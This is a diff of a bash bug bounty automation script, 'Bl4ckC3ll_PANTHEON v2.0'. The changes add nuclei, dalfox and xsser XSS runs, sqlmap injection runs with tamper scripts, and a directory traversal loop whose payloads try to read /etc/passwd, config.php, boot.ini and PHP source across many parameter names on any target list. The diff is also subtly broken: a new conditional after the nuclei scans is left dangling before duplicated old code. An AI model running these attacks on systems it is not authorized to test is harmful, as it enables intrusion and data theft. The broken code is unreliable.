@@ -1,13 +1,15 @@
 #!/bin/bash
-# Bug Bounty Automation Commands for Bl4ckC3ll_PANTHEON
+# Bug Bounty Automation Commands for Bl4ckC3ll_PANTHEON v2.0
 # Author: @cxb3rf1lth
-# Description: Comprehensive bug bounty reconnaissance and testing automation
+# Description: Enhanced comprehensive bug bounty reconnaissance and testing automation
 
 set -euo pipefail
 
 # Configuration
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
 RESULTS_DIR="${SCRIPT_DIR}/bug_bounty_results"
+PAYLOADS_DIR="${SCRIPT_DIR}/payloads"
+WORDLISTS_DIR="${SCRIPT_DIR}/wordlists_extra"
 TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
 LOG_FILE="${RESULTS_DIR}/bug_bounty_${TIMESTAMP}.log"
 
@@ -22,30 +24,79 @@ NC='\033[0m' # No Color
 
 # Create results directory
 mkdir -p "${RESULTS_DIR}"
+mkdir -p "${RESULTS_DIR}/partial"
 
-# Logging function
+# Enhanced logging function
 log() {
     echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "${LOG_FILE}"
 }
 
-# Enhanced error handling with recovery
+# Enhanced error handling with recovery and backup
 error_exit() {
     log "${RED}[ERROR] $1${NC}" >&2
     # Try to save any partial results
     save_partial_results
+    # Create error report
+    create_error_report "$1"
     exit 1
 }
 
-# Enhanced error handler with retry capability
+# Save partial results to prevent data loss
+save_partial_results() {
+    local partial_dir="${RESULTS_DIR}/partial/recovery_${TIMESTAMP}"
+    mkdir -p "$partial_dir"
+    
+    # Copy any existing results
+    if [[ -d "${RESULTS_DIR}" ]]; then
+        find "${RESULTS_DIR}" -name "*.txt" -o -name "*.json" -o -name "*.xml" 2>/dev/null | \
+        while read -r file; do
+            if [[ -s "$file" ]]; then
+                cp "$file" "$partial_dir/" 2>/dev/null || true
+            fi
+        done
+        log "${YELLOW}[RECOVERY] Partial results saved to: $partial_dir${NC}"
+    fi
+}
+
+# Create error report with context
+create_error_report() {
+    local error_msg="$1"
+    local error_report="${RESULTS_DIR}/error_report_${TIMESTAMP}.txt"
+    
+    {
+        echo "=== Bl4ckC3ll_PANTHEON Error Report ==="
+        echo "Timestamp: $(date)"
+        echo "Error: $error_msg"
+        echo "Script: ${BASH_SOURCE[0]}"
+        echo "Working Directory: $(pwd)"
+        echo "Available Tools:"
+        command -v subfinder >/dev/null 2>&1 && echo "  ✓ subfinder" || echo "  ✗ subfinder"
+        command -v nuclei >/dev/null 2>&1 && echo "  ✓ nuclei" || echo "  ✗ nuclei"
+        command -v httpx >/dev/null 2>&1 && echo "  ✓ httpx" || echo "  ✗ httpx"
+        command -v ffuf >/dev/null 2>&1 && echo "  ✓ ffuf" || echo "  ✗ ffuf"
+        command -v nmap >/dev/null 2>&1 && echo "  ✓ nmap" || echo "  ✗ nmap"
+        echo "System Info:"
+        uname -a
+        echo "Disk Space:"
+        df -h . 2>/dev/null || echo "Unable to check disk space"
+        echo "Memory Usage:"
+        free -h 2>/dev/null || echo "Unable to check memory"
+    } > "$error_report"
+    
+    log "${YELLOW}[ERROR REPORT] Created: $error_report${NC}"
+}
+
+# Enhanced error handler with exponential backoff retry capability
 handle_error() {
     local cmd="$1"
     local attempt="$2"
     local max_attempts="${3:-3}"
     
     if [[ $attempt -lt $max_attempts ]]; then
+        local wait_time=$((attempt * attempt * 2))  # Exponential backoff
         warning "Command failed (attempt $attempt/$max_attempts): $cmd"
-        warning "Retrying in $((attempt * 2)) seconds..."
-        sleep $((attempt * 2))
+        warning "Retrying in ${wait_time} seconds..."
+        sleep $wait_time
         return 1
     else
         error_exit "Command failed after $max_attempts attempts: $cmd"
@@ -418,35 +469,83 @@ vuln_scan() {
     local scan_success=0
     local total_scans=0
     
-    # Nuclei - comprehensive vulnerability scanner with enhanced templates
+    # Nuclei - enhanced vulnerability scanner with comprehensive templates
     if nuclei_tool=$(check_tool_with_fallback "nuclei"); then
-        info "Running $nuclei_tool with comprehensive templates..."
+        info "Running $nuclei_tool with enhanced template coverage..."
         ((total_scans++))
         
-        # Run multiple nuclei scans with different severity levels and categories
+        # Update nuclei templates first
+        info "Updating nuclei templates..."
+        "$nuclei_tool" -update-templates >/dev/null 2>&1 || warning "Failed to update nuclei templates"
+        
+        # Run multiple nuclei scans with different categories and enhanced coverage
         local nuclei_success=0
         
-        # Critical and High severity first
-        if timeout 1800 "$nuclei_tool" -list "${targets_file}" \
+        # Critical and High severity scan with enhanced rate limiting
+        info "Running critical/high severity nuclei scan..."
+        if timeout 2400 "$nuclei_tool" -list "${targets_file}" \
            -o "${output_dir}/nuclei_critical_high.txt" \
-           -severity critical,high -silent -stats -rate-limit 50 -c 20; then
+           -severity critical,high -silent -stats -rate-limit 30 -c 15 \
+           -exclude-severity info -interactsh-disable; then
             ((nuclei_success++))
             success "Nuclei critical/high severity scan completed"
         else
             warning "Nuclei critical/high severity scan failed"
         fi
         
-        # Medium and Low severity
-        if timeout 2400 "$nuclei_tool" -list "${targets_file}" \
+        # Medium and Low severity with broader coverage
+        info "Running medium/low severity nuclei scan..."
+        if timeout 3600 "$nuclei_tool" -list "${targets_file}" \
            -o "${output_dir}/nuclei_medium_low.txt" \
-           -severity medium,low -silent -stats -rate-limit 100 -c 30; then
+           -severity medium,low -silent -stats -rate-limit 50 -c 25 \
+           -interactsh-disable; then
             ((nuclei_success++))
             success "Nuclei medium/low severity scan completed"
         else
             warning "Nuclei medium/low severity scan failed"
         fi
         
-        # Technology-specific templates
+        # Technology-specific templates with enhanced detection
+        info "Running technology-specific nuclei scan..."
+        if timeout 1800 "$nuclei_tool" -list "${targets_file}" \
+           -o "${output_dir}/nuclei_tech_specific.txt" \
+           -tags tech,cms,framework -silent -stats -rate-limit 40 -c 20 \
+           -interactsh-disable; then
+            ((nuclei_success++))
+            success "Nuclei technology-specific scan completed"
+        else
+            warning "Nuclei technology-specific scan failed"
+        fi
+        
+        # Custom templates if available
+        local custom_templates_dir="${SCRIPT_DIR}/nuclei-templates/custom"
+        if [[ -d "$custom_templates_dir" ]]; then
+            info "Running custom nuclei templates..."
+            if timeout 1200 "$nuclei_tool" -list "${targets_file}" \
+               -o "${output_dir}/nuclei_custom.txt" \
+               -t "$custom_templates_dir" -silent -stats -rate-limit 30 -c 15 \
+               -interactsh-disable; then
+                ((nuclei_success++))
+                success "Custom nuclei templates scan completed"
+            else
+                warning "Custom nuclei templates scan failed"
+            fi
+        fi
+        
+        # Fuzzing templates for enhanced coverage
+        info "Running nuclei fuzzing templates..."
+        if timeout 1800 "$nuclei_tool" -list "${targets_file}" \
+           -o "${output_dir}/nuclei_fuzzing.txt" \
+           -tags fuzz,injection,sqli,xss -silent -stats -rate-limit 25 -c 12 \
+           -interactsh-disable; then
+            ((nuclei_success++))
+            success "Nuclei fuzzing scan completed"
+        else
+            warning "Nuclei fuzzing scan failed"
+        fi
+        
+        # Combine nuclei results with deduplication
+        if [[ $nuclei_success -gt 0 ]]; then
         if timeout 1200 "$nuclei_tool" -list "${targets_file}" \
            -o "${output_dir}/nuclei_tech_specific.txt" \
            -tags tech -silent -stats -rate-limit 75 -c 25; then
@@ -510,7 +609,7 @@ vuln_scan() {
         fi
     fi
     
-    # Enhanced XSS testing with multiple payloads
+    # Enhanced XSS testing with comprehensive payloads
     if dalfox_tool=$(check_tool_with_fallback "dalfox" "xsser"); then
         info "Running enhanced XSS testing with $dalfox_tool..."
         ((total_scans++))
@@ -521,6 +620,9 @@ vuln_scan() {
         local xss_success=0
         local tested_xss=0
         
+        # Use enhanced XSS payloads if available
+        local xss_payloads_file="${PAYLOADS_DIR}/xss/advanced_xss.txt"
+        
         while IFS= read -r url && [[ $tested_xss -lt 15 ]]; do
             [[ -z "${url}" ]] && continue
             ((tested_xss++))
@@ -528,16 +630,38 @@ vuln_scan() {
             local url_safe=$(echo "$url" | tr '/' '_' | tr ':' '_')
             
             if [[ "$dalfox_tool" == "dalfox" ]]; then
-                if timeout 180 dalfox url "${url}" \
-                   --output "${xss_results}/dalfox_${url_safe}.txt" \
-                   --silence --worker 5 --delay 100 --timeout 10; then
-                    ((xss_success++))
+                # Use custom payloads if available
+                if [[ -f "$xss_payloads_file" ]]; then
+                    if timeout 240 dalfox url "${url}" \
+                       --custom-payload "$xss_payloads_file" \
+                       --output "${xss_results}/dalfox_${url_safe}.txt" \
+                       --silence --worker 3 --delay 150 --timeout 15 \
+                       --format json --mining-dom --mining-dict; then
+                        ((xss_success++))
+                    fi
+                else
+                    # Standard dalfox scan
+                    if timeout 180 dalfox url "${url}" \
+                       --output "${xss_results}/dalfox_${url_safe}.txt" \
+                       --silence --worker 5 --delay 100 --timeout 10 \
+                       --format json; then
+                        ((xss_success++))
+                    fi
                 fi
             else
-                # Fallback to xsser if available
-                if timeout 180 xsser --url="${url}" \
-                   --output="${xss_results}/xsser_${url_safe}.txt" 2>/dev/null; then
-                    ((xss_success++))
+                # Fallback to xsser with custom payloads
+                if [[ -f "$xss_payloads_file" ]]; then
+                    if timeout 180 xsser --url="${url}" \
+                       --payload-list="$xss_payloads_file" \
+                       --output="${xss_results}/xsser_${url_safe}.txt" 2>/dev/null; then
+                        ((xss_success++))
+                    fi
+                else
+                    # Standard xsser scan
+                    if timeout 180 xsser --url="${url}" \
+                       --output="${xss_results}/xsser_${url_safe}.txt" 2>/dev/null; then
+                        ((xss_success++))
+                    fi
                 fi
             fi
         done < <(head -15 "${targets_file}")
@@ -550,36 +674,125 @@ vuln_scan() {
         fi
     fi
     
-    # Additional security tests
+    # Enhanced SQL injection testing with advanced payloads
+    if sqlmap_tool=$(check_tool_with_fallback "sqlmap"); then
+        info "Running enhanced SQL injection testing with $sqlmap_tool..."
+        ((total_scans++))
+        
+        local params_file="${RESULTS_DIR}/parameters/all_parameters.txt"
+        local sqlmap_results="${output_dir}/sqlmap_results"
+        mkdir -p "$sqlmap_results"
+        
+        local sql_success=0
+        local tested_urls=0
+        
+        # Use advanced SQLi payloads if available
+        local sqli_payloads_file="${PAYLOADS_DIR}/sqli/advanced_sqli.txt"
+        
+        while IFS= read -r url && [[ $tested_urls -lt 20 ]]; do
+            [[ -z "${url}" ]] && continue
+            ((tested_urls++))
+            
+            local url_safe=$(echo "$url" | tr '/' '_' | tr ':' '_')
+            local output_file="${sqlmap_results}/sqlmap_${url_safe}"
+            
+            # Enhanced SQLMap options with custom payloads
+            local sqlmap_options=(
+                "--batch"
+                "--random-agent"  
+                "--timeout=30"
+                "--retries=2"
+                "--level=2"
+                "--risk=2"
+                "--threads=3"
+                "--technique=BEUSTQ"
+            )
+            
+            # Add custom payloads if available
+            if [[ -f "$sqli_payloads_file" ]]; then
+                sqlmap_options+=("--tamper=space2comment,randomcase")
+            fi
+            
+            # Test GET parameters
+            if timeout 300 "$sqlmap_tool" -u "${url}*" \
+               "${sqlmap_options[@]}" \
+               --output-dir="$output_file" 2>/dev/null; then
+                ((sql_success++))
+            fi
+            
+            # Test with parameters file if available
+            if [[ -f "$params_file" ]] && [[ -s "$params_file" ]]; then
+                local param_count=0
+                while IFS= read -r param && [[ $param_count -lt 5 ]]; do
+                    [[ -z "$param" ]] && continue
+                    ((param_count++))
+                    
+                    local test_url="${url}?${param}=1"
+                    if timeout 240 "$sqlmap_tool" -u "$test_url" \
+                       "${sqlmap_options[@]}" \
+                       --output-dir="${output_file}_param_${param}" 2>/dev/null; then
+                        ((sql_success++))
+                    fi
+                done < "$params_file"
+            fi
+            
+        done < <(head -20 "${targets_file}")
+        
+        if [[ $sql_success -gt 0 ]]; then
+            success "SQL injection testing completed with $sql_success successful tests"
+            ((scan_success++))
+        else
+            warning "SQL injection testing found no vulnerabilities or failed"
+        fi
+    fi
     
-    # Directory traversal testing
+    # Enhanced Directory traversal testing with comprehensive payloads
     if command -v curl &> /dev/null; then
-        info "Testing for directory traversal vulnerabilities..."
+        info "Testing for directory traversal vulnerabilities with enhanced payloads..."
         ((total_scans++))
         
         local dt_results="${output_dir}/directory_traversal.txt"
         local dt_success=0
         local dt_tested=0
         
+        # Enhanced payload list
         local payloads=(
             "../../../etc/passwd"
             "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
             "....//....//....//etc//passwd"
             "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+            "..%252f..%252f..%252fetc%252fpasswd"
+            "php://filter/convert.base64-encode/resource=index.php"
+            "file:///etc/passwd"
+            "/var/www/html/config.php"
+            "C:\\boot.ini"
+            "../../../../../../../../../etc/passwd%00"
         )
+        
+        # Use custom LFI payloads if available
+        local lfi_payloads_file="${PAYLOADS_DIR}/lfi/directory_traversal.txt"
+        if [[ -f "$lfi_payloads_file" ]]; then
+            mapfile -t payloads < "$lfi_payloads_file"
+        fi
         
         while IFS= read -r url && [[ $dt_tested -lt 10 ]]; do
             [[ -z "${url}" ]] && continue
             ((dt_tested++))
             
             for payload in "${payloads[@]}"; do
-                local test_url="${url}?file=${payload}"
-                if response=$(timeout 15 curl -s -k --max-time 10 "$test_url" 2>/dev/null); then
-                    if echo "$response" | grep -qE "(root:|admin:|administrator:)" 2>/dev/null; then
-                        echo "[VULNERABILITY] Directory Traversal found: $test_url" >> "$dt_results"
-                        ((dt_success++))
+                [[ -z "$payload" ]] && continue
+                
+                # Test multiple parameter names
+                for param in "file" "path" "page" "include" "doc" "document"; do
+                    local test_url="${url}?${param}=${payload}"
+                    if response=$(timeout 15 curl -s -k --max-time 10 "$test_url" 2>/dev/null); then
+                        if echo "$response" | grep -qE "(root:|admin:|administrator:|boot loader|kernel)" 2>/dev/null; then
+                            echo "[VULNERABILITY] Directory Traversal found: $test_url" >> "$dt_results"
+                            echo "Response preview: $(echo "$response" | head -3)" >> "$dt_results"
+                            ((dt_success++))
+                        fi
                     fi
-                fi
+                done
             done
         done < <(head -10 "${targets_file}")
         
